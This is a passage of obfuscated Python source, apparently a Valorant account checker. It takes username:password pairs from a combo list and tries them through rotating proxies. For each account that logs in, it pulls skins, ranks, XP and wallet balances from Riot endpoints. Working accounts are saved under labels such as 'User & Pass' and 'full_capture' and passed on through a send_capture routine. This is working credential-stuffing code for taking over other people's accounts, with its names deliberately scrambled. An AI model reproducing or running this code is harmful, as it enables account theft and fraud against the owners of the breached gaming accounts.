                                                                "X-Riot-ClientPlatform": "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9"},
                                                       proxy=OO0O00O00OO0O0000["url"], proxy_auth=OO0O00O00OO0O0000[
                                        "proxy_auth"])as OO00OO0OO0000OOOO:  # line:1542
                                O0OO0O00OOO00000O = await O000O0O00OO0O0O0O.convert_req_to_json(
                                    OO00OO0OO0000OOOO)  # line:1543
                            OOO0O00OO000O0OOO = await O000O0O00OO0O0O0O.convert_entitlements(
                                O0OO0O00OOO00000O)  # line:1545
                            if OOO0O00OO000O0OOO == {}:  # line:1547
                                OO0O0OOOOO0OOO0O0[O00000O00O0000OOO] = {"Skins": [], "Skin Variants": [], "Agents": [],
                                                                        "Contracts": [], "Sprays": [], "Cards": [],
                                                                        "Titles": [], "Gun Buddies": [], }  # line:1557
                            else:  # line:1558
                                OO0O0OOOOO0OOO0O0[O00000O00O0000OOO] = OOO0O00OO000O0OOO  # line:1559
                    return OO0O0OOOOO0OOO0O0  # line:1561

                async def OOOOO000O0OO0O00O(O0OO00OO00OOOO0O0, OOOO00OO0OO000OO0, OOO0O00O00O00O00O, OO0O0000O0000O00O,
                                            OO00O00000O0OOOOO):  # line:1563
                    OOO0O00OO000O0O00 = {}  # line:1564
                    for O0O00OO00OO00O000 in O000O0O00OO0O0O0O._["regions"]:  # line:1566
                        if O0O00OO00OO00O000 not in OO00O00000O0OOOOO:  # line:1567
                            async with aiohttp.request("GET", O000O0O00OO0O0O0O._["endpoints"]["player_xp"].format(
                                    O0O00OO00OO00O000, OO0O0000O0000O00O), timeout=aiohttp.ClientTimeout(
                                    total=O000O0O00OO0O0O0O._["timeout"], sock_connect=O000O0O00OO0O0O0O._["timeout"],
                                    sock_read=O000O0O00OO0O0O0O._["timeout"]),
                                                       headers={"Content-Type": "application/json",
                                                                "Authorization": f"Bearer {OOOO00OO0OO000OO0}",
                                                                "X-Riot-Entitlements-JWT": OOO0O00O00O00O00O, },
                                                       proxy=O0OO00OO00OOOO0O0["url"], proxy_auth=O0OO00OO00OOOO0O0[
                                        "proxy_auth"])as O0O00OO0OO0OOOO0O:  # line:1572
                                O0000O00O0O0O0O00 = (
                                    await O000O0O00OO0O0O0O.convert_req_to_json(O0O00OO0OO0OOOO0O))  # line:1573
                            if O0000O00O0O0O0O00.get("Progress", None) and O0000O00O0O0O0O00["Progress"].get("Level",
                                                                                                             None):  # line:1575
                                OOO0O00OO000O0O00[O0O00OO00OO00O000] = O0000O00O0O0O0O00["Progress"]  # line:1576
                            else:  # line:1578
                                OOO0O00OO000O0O00[O0O00OO00OO00O000] = {"Level": "Unknown",
                                                                        "XP": "Unknown"}  # line:1582
                    return OOO0O00OO000O0O00  # line:1584

                OO00O0O0O0OO00OOO = await OOO00OO0000000O00(OOO0O0OOO00O0OOOO, O0OO0OOOO0000O0O0, O0O0OO00OO0OO0O0O,
                                                            OOO0O00O00O0OOOO0, O00000O0O0O0OOOO0)  # line:1587
                OO0OO000OOOOO0000 = await OOOOO000O0OO0O00O(OOO0O0OOO00O0OOOO, O0OO0OOOO0000O0O0, O0O0OO00OO0OO0O0O,
                                                            OOO0O00O00O0OOOO0, O00000O0O0O0OOOO0)  # line:1589
                for O0OO0O00000O0O0O0 in OO0OO000OOOOO0000:  # line:1591
                    OO000O0O0000OO0OO[f"[{O0OO0O00000O0O0O0.upper()}] Level"] = OO0OO000OOOOO0000[O0OO0O00000O0O0O0][
                        "Level"]  # line:1592
                    OO000O0O0000OO0OO[f"[{O0OO0O00000O0O0O0.upper()}] XP"] = OO0OO000OOOOO0000[O0OO0O00000O0O0O0][
                        "XP"]  # line:1593
                OO00000O0000000O0 = ""  # line:1595
                for O0OO0O00000O0O0O0 in OO00O0O0O0OO00OOO:  # line:1597
                    for O00000O0000O0000O in OO00O0O0O0OO00OOO[O0OO0O00000O0O0O0]:  # line:1598
                        try:  # line:1599
                            OO00000O0000000O0 += O000O0O00OO0O0O0O.add_inventory_type(O00000O0000O0000O, '',
                                                                                      OO00O0O0O0OO00OOO[
                                                                                          O0OO0O00000O0O0O0][
                                                                                          O00000O0000O0000O],
                                                                                      O0OO0O00000O0O0O0.upper())  # line:1601
                        except:  # line:1602
                            pass  # line:1603
                O00OOOO0000O00O0O = O000O0O00OO0O0O0O.raw_user_info(OO00O00O0000O0O0O, OOO0000000OOOOO00,
                                                                    OO000O0O0000OO0OO)  # line:1606
                if OOOOOOO00OOOOOOO0 not in O000O0O00OO0O0O0O._["stats"]["_captured"]["inventory"]:  # line:1608
                    O000O0O00OO0O0O0O._["stats"]["save"][
                        "inventory"] += f"\nUser & Pass: {O000O0O00OO0O0O0O.get_raw_combo(OOO0000000OOOOO00)}{OO00000O0000000O0}\n<{'=' * O000O0O00OO0O0O0O._['new_line_multiply']}>"  # line:1610
                    O000O0O00OO0O0O0O._["stats"]["_captured"]["inventory"].append(OOOOOOO00OOOOOOO0)  # line:1611
                if OOOOOOO00OOOOOOO0 not in O000O0O00OO0O0O0O._["stats"]["_captured"][
                    "inventory_user_info"]:  # line:1613
                    O000O0O00OO0O0O0O._["stats"]["save"][
                        "inventory_user_info"] += f"{O00OOOO0000O00O0O}{OO00000O0000000O0}\n<{'=' * O000O0O00OO0O0O0O._['new_line_multiply']}>"  # line:1615
                O000O0O00OO0O0O0O.save_stats()  # line:1617

                async def O00O0O00O00O0O0OO(OO0O0OO0OO0O00O00, OOO00OOO0O00OO0OO, OOOO000000O0OO00O, O0OOOOO000OOOO0O0,
                                            O000O00OOO0O0OOO0):  # line:1619
                    OO0OOOOOO00OOOOOO = {}  # line:1620
                    for O0O0O00OO000O000O in O000O0O00OO0O0O0O._["regions"]:  # line:1622
                        if O0O0O00OO000O000O not in O000O00OOO0O0OOO0:  # line:1623
                            async with aiohttp.request("GET", O000O0O00OO0O0O0O._["endpoints"]["ranked_data"].format(
                                    O0O0O00OO000O000O, O0OOOOO000OOOO0O0), timeout=aiohttp.ClientTimeout(
                                    total=O000O0O00OO0O0O0O._["timeout"], sock_connect=O000O0O00OO0O0O0O._["timeout"],
                                    sock_read=O000O0O00OO0O0O0O._["timeout"]),
                                                       headers={"Content-Type": "application/json",
                                                                "Authorization": f"Bearer {OOO00OOO0O00OO0OO}",
                                                                "X-Riot-Entitlements-JWT": OOOO000000O0OO00O,
                                                                "X-Riot-ClientVersion":
                                                                    O000O0O00OO0O0O0O._["api_data"]["client_version"][
                                                                        "riotClientVersion"],
                                                                "X-Riot-ClientPlatform": "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9"},
                                                       proxy=OO0O0OO0OO0O00O00["url"], proxy_auth=OO0O0OO0OO0O00O00[
                                        "proxy_auth"])as O0OOOO0OOO0O0000O:  # line:1630
                                OOOOOO00OOOO0OOO0 = await O000O0O00OO0O0O0O.convert_req_to_json(
                                    O0OOOO0OOO0O0000O)  # line:1631
                                try:  # line:1633
                                    if len(OOOOOO00OOOO0OOO0["Matches"]) == 0:  # line:1634
                                        OO0OOOOOO00OOOOOO[O0O0O00OO000O000O] = "Unranked"  # line:1635
                                    else:  # line:1636
                                        OO0OOOOOO00OOOOOO[O0O0O00OO000O000O] = O000O0O00OO0O0O0O._["ranks"][
                                            (await O0OOOO0OOO0O0000O.text()).split('"TierAfterUpdate":')[1].split(',"')[
                                                0]]  # line:1638
                                except:  # line:1639
                                    OO0OOOOOO00OOOOOO[O0O0O00OO000O000O] = "Unknown"  # line:1640
                    return OO0OOOOOO00OOOOOO  # line:1642

                OO00OO0O00000O0O0 = await O00O0O00O00O0O0OO(OOO0O0OOO00O0OOOO, O0OO0OOOO0000O0O0, O0O0OO00OO0OO0O0O,
                                                            OOO0O00O00O0OOOO0, O00000O0O0O0OOOO0)  # line:1644
                O0OOO0OO000000O00 = {}  # line:1646
                for O0OO0O00000O0O0O0 in OO00OO0O00000O0O0:  # line:1648
                    OO000O0O0000OO0OO[f"[{O0OO0O00000O0O0O0.upper()}] Rank"] = OO00OO0O00000O0O0[
                        O0OO0O00000O0O0O0]  # line:1649
                    O0OOO0OO000000O00[f"[{O0OO0O00000O0O0O0.upper()}] Rank"] = OO00OO0O00000O0O0[
                        O0OO0O00000O0O0O0]  # line:1650
                OO00O0O0O000OOO0O = O000O0O00OO0O0O0O.raw_user_info(OO00O00O0000O0O0O, OOO0000000OOOOO00,
                                                                    OO000O0O0000OO0OO)  # line:1653
                OOO0000O000O0OO0O = f"\nUser & Pass: {O000O0O00OO0O0O0O.get_raw_combo(OOO0000000OOOOO00)}"  # line:1654
                for O0OO0O00000O0O0O0 in OO00OO0O00000O0O0:  # line:1656
                    OOO0000O000O0OO0O += f"\n[{O0OO0O00000O0O0O0.upper()}] Rank: {OO00OO0O00000O0O0[O0OO0O00000O0O0O0]}"  # line:1657
                OOO0000O000O0OO0O += f"{OO00000O0000000O0}"  # line:1659
                OO0OOOO0OOO00OO00 = f"\nUser & Pass: {O000O0O00OO0O0O0O.get_raw_combo(OOO0000000OOOOO00)}"  # line:1661
                for OOO000000000O0O0O in O0OOO0OO000000O00:  # line:1663
                    OO0OOOO0OOO00OO00 += f"\n| {OOO000000000O0O0O}: {O0OOO0OO000000O00[OOO000000000O0O0O]}"  # line:1664
                OO0OOOO0OOO00OO00 += f"\n<{'=' * O000O0O00OO0O0O0O._['new_line_multiply']}>"  # line:1666
                OO00O0O0OOO0O0OOO = O000O0O00OO0O0O0O.raw_user_info(OO00O00O0000O0O0O, OOO0000000OOOOO00,
                                                                    OO000O0O0000OO0OO)  # line:1669
                if OOOOOOO00OOOOOOO0 not in O000O0O00OO0O0O0O._["stats"]["_captured"][
                    "inventory_rank_user_info"]:  # line:1671
                    O000O0O00OO0O0O0O._["stats"]["save"][
                        "inventory_rank_user_info"] += f"{OO00O0O0OOO0O0OOO}{OO00000O0000000O0}\n<{'=' * O000O0O00OO0O0O0O._['new_line_multiply']}>"  # line:1673
                    O000O0O00OO0O0O0O._["stats"]["_captured"]["inventory_rank_user_info"].append(
                        OOOOOOO00OOOOOOO0)  # line:1675
                O000O0O00OO0O0O0O.save_stats()  # line:1677
                if OOOOOOO00OOOOOOO0 not in O000O0O00OO0O0O0O._["stats"]["_captured"]["rank"]:  # line:1679
                    O000O0O00OO0O0O0O._["stats"]["save"]["rank"] += OO0OOOO0OOO00OO00  # line:1680
                    O000O0O00OO0O0O0O._["stats"]["_captured"]["rank"].append(OOOOOOO00OOOOOOO0)  # line:1681
                if OOOOOOO00OOOOOOO0 not in O000O0O00OO0O0O0O._["stats"]["_captured"]["rank_user_info"]:  # line:1683
                    O000O0O00OO0O0O0O._["stats"]["save"][
                        "rank_user_info"] += f"\n{OO00O0O0O000OOO0O}\n<{'=' * O000O0O00OO0O0O0O._['new_line_multiply']}>"  # line:1685
                    O000O0O00OO0O0O0O._["stats"]["_captured"]["rank_user_info"].append(OOOOOOO00OOOOOOO0)  # line:1687
                if OOOOOOO00OOOOOOO0 not in O000O0O00OO0O0O0O._["stats"]["_captured"]["inventory_rank"]:  # line:1689
                    O000O0O00OO0O0O0O._["stats"]["save"][
                        "inventory_rank"] += f"\n{OOO0000O000O0OO0O}\n<{'=' * O000O0O00OO0O0O0O._['new_line_multiply']}>"  # line:1691
                    O000O0O00OO0O0O0O._["stats"]["_captured"]["inventory_rank"].append(OOOOOOO00OOOOOOO0)  # line:1693
                O000O0O00OO0O0O0O.save_stats()  # line:1695

                async def OO0OO0OO0O0O0OO00(OO0O0O0O00000O0OO, O00O00000O00O0O00, OOO00O0O000OOO00O, OO00O0O00O0OOOOO0,
                                            O0OOOOOO00OO0OO00):  # line:1697
                    O0OO00O0OOO000O00 = {}  # line:1698
                    for OO00OOOO000O0O00O in O000O0O00OO0O0O0O._["regions"]:  # line:1700
                        if OO00OOOO000O0O00O not in O0OOOOOO00OO0OO00:  # line:1701
                            async with aiohttp.request("GET", O000O0O00OO0O0O0O._["endpoints"]["wallet"].format(
                                    OO00OOOO000O0O00O, OO00O0O00O0OOOOO0), timeout=aiohttp.ClientTimeout(
                                    total=O000O0O00OO0O0O0O._["timeout"], sock_connect=O000O0O00OO0O0O0O._["timeout"],
                                    sock_read=O000O0O00OO0O0O0O._["timeout"]),
                                                       headers={"Content-Type": "application/json",
                                                                "Authorization": f"Bearer {O00O00000O00O0O00}",
                                                                "X-Riot-Entitlements-JWT": OOO00O0O000OOO00O,
                                                                "X-Riot-ClientVersion":
                                                                    O000O0O00OO0O0O0O._["api_data"]["client_version"][
                                                                        "riotClientVersion"],
                                                                "X-Riot-ClientPlatform": "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9"},
                                                       proxy=OO0O0O0O00000O0OO["url"], proxy_auth=OO0O0O0O00000O0OO[
                                        "proxy_auth"])as OO0000O0OOO0O0O0O:  # line:1708
                                O0OOOO0O0OO0OO0OO = await O000O0O00OO0O0O0O.convert_req_to_json(
                                    OO0000O0OOO0O0O0O)  # line:1709
                            O0OO00O0OOO000O00[OO00OOOO000O0O00O] = {}  # line:1711
                            try:  # line:1713
                                for OOO000O0O00O0OOOO in O0OOOO0O0OO0OO0OO["Balances"]:  # line:1715
                                    for _OOOO0OO0O0OO0000O in O000O0O00OO0O0O0O._["api_data"]["currency"]:  # line:1716
                                        if _OOOO0OO0O0OO0000O["uuid"] == OOO000O0O00O0OOOO:  # line:1717
                                            O0OO00O0OOO000O00[OO00OOOO000O0O00O][_OOOO0OO0O0OO0000O["displayName"]] = \
                                            O0OOOO0O0OO0OO0OO["Balances"][OOO000O0O00O0OOOO]  # line:1719
                            except:  # line:1721
                                pass  # line:1722
                    return O0OO00O0OOO000O00  # line:1724

                OOO00O0O0OOOO00O0 = await OO0OO0OO0O0O0OO00(OOO0O0OOO00O0OOOO, O0OO0OOOO0000O0O0, O0O0OO00OO0OO0O0O,
                                                            OOO0O00O00O0OOOO0, O00000O0O0O0OOOO0)  # line:1726
                OOO0OOOOO0O0OOOOO = f"\nUser & Pass: {O000O0O00OO0O0O0O.get_raw_combo(OOO0000000OOOOO00)}"  # line:1728
                OOO0000000OO00O0O = f"\nUser & Pass: {O000O0O00OO0O0O0O.get_raw_combo(OOO0000000OOOOO00)}"  # line:1729
                for O0OO0O00000O0O0O0 in OO00OO0O00000O0O0:  # line:1731
                    OOO0000000OO00O0O += f"\n[{O0OO0O00000O0O0O0.upper()}] Rank: {OO00OO0O00000O0O0[O0OO0O00000O0O0O0]}"  # line:1732
                for O0OO0O00000O0O0O0 in OOO00O0O0OOOO00O0:  # line:1734
                    for OO0O00O0O0O0000O0 in OOO00O0O0OOOO00O0[O0OO0O00000O0O0O0]:  # line:1735
                        OO000O0O0000OO0OO[f"[{O0OO0O00000O0O0O0.upper()}] {OO0O00O0O0O0000O0}"] = \
                        OOO00O0O0OOOO00O0[O0OO0O00000O0O0O0][OO0O00O0O0O0000O0]  # line:1736
                        OOO0OOOOO0O0OOOOO += f"\n[{O0OO0O00000O0O0O0.upper()}] {OO0O00O0O0O0000O0}: {OOO00O0O0OOOO00O0[O0OO0O00000O0O0O0][OO0O00O0O0O0000O0]}"  # line:1737
                        OOO0000000OO00O0O += f"\n[{O0OO0O00000O0O0O0.upper()}] {OO0O00O0O0O0000O0}: {OOO00O0O0OOOO00O0[O0OO0O00000O0O0O0][OO0O00O0O0O0000O0]}"  # line:1738
                OO0000O0O00OO0000 = O000O0O00OO0O0O0O.raw_user_info(OO00O00O0000O0O0O, OOO0000000OOOOO00,
                                                                    OO000O0O0000OO0OO)  # line:1741
                if OOOOOOO00OOOOOOO0 not in O000O0O00OO0O0O0O._["stats"]["_captured"]["wallet"]:  # line:1743
                    O000O0O00OO0O0O0O._["stats"]["save"][
                        "wallet"] += f"{OOO0OOOOO0O0OOOOO}\n<{'=' * O000O0O00OO0O0O0O._['new_line_multiply']}>"  # line:1745
                    O000O0O00OO0O0O0O._["stats"]["_captured"]["wallet"].append(OOOOOOO00OOOOOOO0)  # line:1746
                if OOOOOOO00OOOOOOO0 not in O000O0O00OO0O0O0O._["stats"]["_captured"]["rank_wallet"]:  # line:1748
                    O000O0O00OO0O0O0O._["stats"]["save"][
                        "rank_wallet"] += f"{OOO0000000OO00O0O}\n<{'=' * O000O0O00OO0O0O0O._['new_line_multiply']}>"  # line:1750
                    O000O0O00OO0O0O0O._["stats"]["_captured"]["rank_wallet"].append(OOOOOOO00OOOOOOO0)  # line:1752
                if OOOOOOO00OOOOOOO0 not in O000O0O00OO0O0O0O._["stats"]["_captured"][
                    "rank_wallet_user_info"]:  # line:1754
                    O000O0O00OO0O0O0O._["stats"]["save"][
                        "rank_wallet_user_info"] += f"\n{OO0000O0O00OO0000}\n<{'=' * O000O0O00OO0O0O0O._['new_line_multiply']}>"  # line:1756
                    O000O0O00OO0O0O0O._["stats"]["_captured"]["rank_wallet_user_info"].append(
                        OOOOOOO00OOOOOOO0)  # line:1758
                O000O0O00OO0O0O0O.save_stats()  # line:1760
                O0O000OO0O00OO000 = f'\nUser & Pass: {O000O0O00OO0O0O0O.get_raw_combo(OOO0000000OOOOO00)}'  # line:1762
                for O0OO0O00000O0O0O0 in OO00OO0O00000O0O0:  # line:1764
                    O0O000OO0O00OO000 += f"\n[{O0OO0O00000O0O0O0.upper()}] Rank: {OO00OO0O00000O0O0[O0OO0O00000O0O0O0]}"  # line:1765
                for O0OO0O00000O0O0O0 in OOO00O0O0OOOO00O0:  # line:1767
                    for OO0O00O0O0O0000O0 in OOO00O0O0OOOO00O0[O0OO0O00000O0O0O0]:  # line:1768
                        O0O000OO0O00OO000 += f"\n[{O0OO0O00000O0O0O0.upper()}] {OO0O00O0O0O0000O0}: {OOO00O0O0OOOO00O0[O0OO0O00000O0O0O0][OO0O00O0O0O0000O0]}"  # line:1769
                O0O000OO0O00OO000 += f"{OO00000O0000000O0}\n<{'=' * O000O0O00OO0O0O0O._['new_line_multiply']}>"  # line:1771
                if OOOOOOO00OOOOOOO0 not in O000O0O00OO0O0O0O._["stats"]["_captured"][
                    "inventory_rank_wallet"]:  # line:1773
                    O000O0O00OO0O0O0O._["stats"]["save"]["inventory_rank_wallet"] += O0O000OO0O00OO000  # line:1775
                    O000O0O00OO0O0O0O._["stats"]["_captured"]["inventory_rank_wallet"].append(
                        OOOOOOO00OOOOOOO0)  # line:1777
                OOOO0O00OO00OOOOO = O000O0O00OO0O0O0O.raw_user_info(OO00O00O0000O0O0O, OOO0000000OOOOO00,
                                                                    OO000O0O0000OO0OO)  # line:1780
                OOOO0O00OO00OOOOO += f"{OO00000O0000000O0}\n<{'=' * O000O0O00OO0O0O0O._['new_line_multiply']}>"  # line:1781
                if OOOOOOO00OOOOOOO0 not in O000O0O00OO0O0O0O._["stats"]["_captured"]["full_capture"]:  # line:1783
                    O000O0O00OO0O0O0O._["stats"]["save"][
                        "inventory_rank_wallet_user_info"] += OOOO0O00OO00OOOOO  # line:1785
                    O000O0O00OO0O0O0O._["stats"]["save"]["full_capture"] += OOOO0O00OO00OOOOO  # line:1787
                    O000O0O00OO0O0O0O._["stats"]["_captured"]["full_capture"].append(OOOOOOO00OOOOOOO0)  # line:1789
                    O000O0O00OO0O0O0O.log(f"Captured {O000O0O00OO0O0O0O.get_raw_combo(OOO0000000OOOOO00)}",
                                          O0O0O0O0O000O0000)  # line:1790
                    O000O0O00OO0O0O0O._["stats"]["captured"] += 1  # line:1791
                O000O0O00OO0O0O0O.save_stats()  # line:1794
                for O0OO0O00000O0O0O0 in OO00OO0O00000O0O0:  # line:1796
                    O000O0O00OO0O0O0O.filter_rank(OO00OO0O00000O0O0[O0OO0O00000O0O0O0], O0OO0O00000O0O0O0,
                                                  OOOO0O00OO00OOOOO)  # line:1798
                for O0OO0O00000O0O0O0 in OO00O0O0O0OO00OOO:  # line:1800
                    try:  # line:1801
                        O000O0O00OO0O0O0O.filter_skins(len(OO00O0O0O0OO00OOO[O0OO0O00000O0O0O0]["Skins"]),
                                                       O0OO0O00000O0O0O0, OOOO0O00OO00OOOOO)  # line:1803
                    except:  # line:1804
                        O000O0O00OO0O0O0O.filter_skins(0, O0OO0O00000O0O0O0, OOOO0O00OO00OOOOO)  # line:1806
                if OO000O0O0000OO0OO.get("Region", None):  # line:1809
                    if OO00O0O0O0OO00OOO[OO000O0O0000OO0OO['Region'].lower()].get("Skins", None):  # line:1810
                        if len(OO00O0O0O0OO00OOO[OO000O0O0000OO0OO['Region'].lower()]["Skins"]) > 0:  # line:1811
                            O000O0O00OO0O0O0O.send_capture(OOOO0O00OO00OOOOO, OOO0O0OOO00O0OOOO,
                                                           len(OO00O0O0O0OO00OOO[O0OO0O00000O0O0O0]["Skins"]),
                                                           OOO0000000OOOOO00, OO000O0O0000OO0OO)  # line:1813
                        elif OO000O0O0000OO0OO.get([f"[{OO000O0O0000OO0OO['Region']}] Rank"], None):  # line:1814
                            if OO000O0O0000OO0OO[f"[{OO000O0O0000OO0OO['Region']}] Rank"] != "Unranked":  # line:1815
                                O000O0O00OO0O0O0O.send_capture(OOOO0O00OO00OOOOO, OOO0O0OOO00O0OOOO,
                                                               len(OO00O0O0O0OO00OOO[O0OO0O00000O0O0O0]["Skins"]),
                                                               OOO0000000OOOOO00, OO000O0O0000OO0OO)  # line:1817
                    elif OO000O0O0000OO0OO.get(f"[{OO000O0O0000OO0OO['Region']}] Rank", None):  # line:1819
                        if OO000O0O0000OO0OO[f"[{OO000O0O0000OO0OO['Region']}] Rank"] != "Unranked":  # line:1820
                            O000O0O00OO0O0O0O.send_capture(OOOO0O00OO00OOOOO, OOO0O0OOO00O0OOOO, 0, OOO0000000OOOOO00,
                                                           OO000O0O0000OO0OO)  # line:1821
                OO0000O00000OO0OO = O000O0O00OO0O0O0O.combo()  # line:1823
                if OO0000O00000OO0OO:  # line:1824
                    await O000O0O00OO0O0O0O.check(O0O0O0O0O000O0000, {"username": OO0000O00000OO0OO.split(":")[0],
                                                                      "password": "".join(
                                                                          OO0000O00000OO0OO.split(":")[1:])},
                                                  OOO0O0OOO00O0OOOO)  # line:1825
                return  # line:1826
            except asyncio.exceptions.TimeoutError:  # line:1828
                O000O0O00OO0O0O0O._["stats"]["errors"] += 1  # line:1829
                O000O0O00OO0O0O0O._["stats"]["retries"] += 1  # line:1830
                await O000O0O00OO0O0O0O.check(O0O0O0O0O000O0000, OOO0000000OOOOO00,
                                              O000O0O00OO0O0O0O.proxy())  # line:1831
                return  # line:1832
            except aiohttp.client_exceptions.ClientConnectorError:  # line:1834
                O000O0O00OO0O0O0O._["stats"]["errors"] += 1  # line:1835
                O000O0O00OO0O0O0O._["stats"]["retries"] += 1  # line:1836
                await O000O0O00OO0O0O0O.check(O0O0O0O0O000O0000, OOO0000000OOOOO00,
                                              O000O0O00OO0O0O0O.proxy())  # line:1837
                return  # line:1838
            except ConnectionAbortedError:  # line:1840
                O000O0O00OO0O0O0O._["stats"]["errors"] += 1  # line:1841
                O000O0O00OO0O0O0O._["stats"]["retries"] += 1  # line:1842
                await O000O0O00OO0O0O0O.check(O0O0O0O0O000O0000, OOO0000000OOOOO00,
                                              O000O0O00OO0O0O0O.proxy())  # line:1843
                return  # line:1844
            except ConnectionResetError:  # line:1846
                O000O0O00OO0O0O0O._["stats"]["errors"] += 1  # line:1847
                O000O0O00OO0O0O0O._["stats"]["retries"] += 1  # line:1848
                await O000O0O00OO0O0O0O.check(O0O0O0O0O000O0000, OOO0000000OOOOO00,
                                              O000O0O00OO0O0O0O.proxy())  # line:1849
                return  # line:1850
            except aiohttp.client_exceptions.ClientOSError:  # line:1852
                O000O0O00OO0O0O0O._["stats"]["errors"] += 1  # line:1853
                O000O0O00OO0O0O0O._["stats"]["retries"] += 1  # line:1854
                await O000O0O00OO0O0O0O.check(O0O0O0O0O000O0000, OOO0000000OOOOO00,
                                              O000O0O00OO0O0O0O.proxy())  # line:1855
                return  # line:1856
            except aiohttp.client_exceptions.ServerDisconnectedError:  # line:1858
                O000O0O00OO0O0O0O._["stats"]["errors"] += 1  # line:1859
                O000O0O00OO0O0O0O._["stats"]["retries"] += 1  # line:1860
                await O000O0O00OO0O0O0O.check(O0O0O0O0O000O0000, OOO0000000OOOOO00,
                                              O000O0O00OO0O0O0O.proxy())  # line:1861
                return  # line:1862
            except:  # line:1864
                O000O0O00OO0O0O0O._["stats"]["errors"] += 1  # line:1865
                if dont_log_errors == False:  # line:1866
                    print(traceback.format_exc())  # line:1867
                O000O0O00OO0O0O0O._["errors"].append(traceback.format_exc())  # line:1868
                O000O0O00OO0O0O0O._["stats"]["unknown"] += 1  # line:1870
                O000O0O00OO0O0O0O._["stats"]["retries"] += 1  # line:1871
                await O000O0O00OO0O0O0O.check(O0O0O0O0O000O0000, OOO0000000OOOOO00,
                                              O000O0O00OO0O0O0O.proxy())  # line:1873
                return  # line:1875
        else:  # line:1876
            OO0000O00000OO0OO = O000O0O00OO0O0O0O.combo()  # line:1877
            if OO0000O00000OO0OO:  # line:1879
                await O000O0O00OO0O0O0O.check(O0O0O0O0O000O0000, {"username": OO0000O00000OO0OO.split(":")[0],
                                                                  "password": "".join(
                                                                      OO0000O00000OO0OO.split(":")[1:])},
                                              OOO0O0OOO00O0OOOO)  # line:1880
            return  # line:1881

    async def convert_entitlements(O00O0O0OOO00O0O00, OO000000O0000OO0O):  # line:1883
        try:  # line:1884
            if OO000000O0000OO0O and len(OO000000O0000OO0O.keys()) >= 1:  # line:1885
                O0O0O000O0OO0OOO0 = OO000000O0000OO0O["EntitlementsByTypes"]  # line:1886
            else:  # line:1887
                return {"Skins": [], "Skin Variants": [], "Agents": [], "Contracts": [], "Sprays": [], "Cards": [],
                        "Titles": [], "Gun Buddies": [], }  # line:1897
            OO0O00OO00OO000O0 = {}  # line:1901
            for O0000O00OOO00OO0O in O0O0O000O0OO0OOO0:  # line:1903
                try:  # line:1904
                    O00OOOO0OO00O0OO0 = O0000O00OOO00OO0O["Entitlements"]  # line:1906
                    OO0O00OO00OO000O0[
                        O00O0O0OOO00O0O00._["item_types"][O0000O00OOO00OO0O["ItemTypeID"]]] = []  # line:1908
                    for OO0OO0O00O0O00O00 in O00OOOO0OO00O0OO0:  # line:1910
                        if O00O0O0OOO00O0O00._["item_types"][O0000O00OOO00OO0O["ItemTypeID"]] == "Skins":  # line:1911
                            OO0O00OO00OO000O0[
                                O00O0O0OOO00O0O00._["item_types"][O0000O00OOO00OO0O["ItemTypeID"]]].append(
                                O00O0O0OOO00O0O00.get_skin_name(OO0OO0O00O0O00O00["ItemID"]))  # line:1913
                        elif O00O0O0OOO00O0O00._["item_types"][
                            O0000O00OOO00OO0O["ItemTypeID"]] == "Skin Variants":  # line:1914
                            OO0O00OO00OO000O0[
                                O00O0O0OOO00O0O00._["item_types"][O0000O00OOO00OO0O["ItemTypeID"]]].append(
                                O00O0O0OOO00O0O00.get_skin_variant_name(OO0OO0O00O0O00O00["ItemID"]))  # line:1916
                        elif O00O0O0OOO00O0O00._["item_types"][
                            O0000O00OOO00OO0O["ItemTypeID"]] == "Agents":  # line:1917
                            OO0O00OO00OO000O0[
                                O00O0O0OOO00O0O00._["item_types"][O0000O00OOO00OO0O["ItemTypeID"]]].append(
                                O00O0O0OOO00O0O00.get_item_name(OO0OO0O00O0O00O00["ItemID"], "agents"))  # line:1919
                        elif O00O0O0OOO00O0O00._["item_types"][
                            O0000O00OOO00OO0O["ItemTypeID"]] == "Contracts":  # line:1920
                            OO0O00OO00OO000O0[
                                O00O0O0OOO00O0O00._["item_types"][O0000O00OOO00OO0O["ItemTypeID"]]].append(
                                O00O0O0OOO00O0O00.get_item_name(OO0OO0O00O0O00O00["ItemID"], "contracts"))  # line:1922
                        elif O00O0O0OOO00O0O00._["item_types"][
                            O0000O00OOO00OO0O["ItemTypeID"]] == "Sprays":  # line:1923
                            OO0O00OO00OO000O0[
                                O00O0O0OOO00O0O00._["item_types"][O0000O00OOO00OO0O["ItemTypeID"]]].append(
                                O00O0O0OOO00O0O00.get_item_name(OO0OO0O00O0O00O00["ItemID"], "sprays"))  # line:1925
                        elif O00O0O0OOO00O0O00._["item_types"][O0000O00OOO00OO0O["ItemTypeID"]] == "Cards":  # line:1926
                            OO0O00OO00OO000O0[
                                O00O0O0OOO00O0O00._["item_types"][O0000O00OOO00OO0O["ItemTypeID"]]].append(
                                O00O0O0OOO00O0O00.get_item_name(OO0OO0O00O0O00O00["ItemID"], "cards"))  # line:1928
                        elif O00O0O0OOO00O0O00._["item_types"][
                            O0000O00OOO00OO0O["ItemTypeID"]] == "Titles":  # line:1929
                            OO0O00OO00OO000O0[
                                O00O0O0OOO00O0O00._["item_types"][O0000O00OOO00OO0O["ItemTypeID"]]].append(
                                O00O0O0OOO00O0O00.get_item_name(OO0OO0O00O0O00O00["ItemID"], "titles"))  # line:1931
                        elif O00O0O0OOO00O0O00._["item_types"][
                            O0000O00OOO00OO0O["ItemTypeID"]] == "Gun Buddies":  # line:1932
                            OO0O00OO00OO000O0[
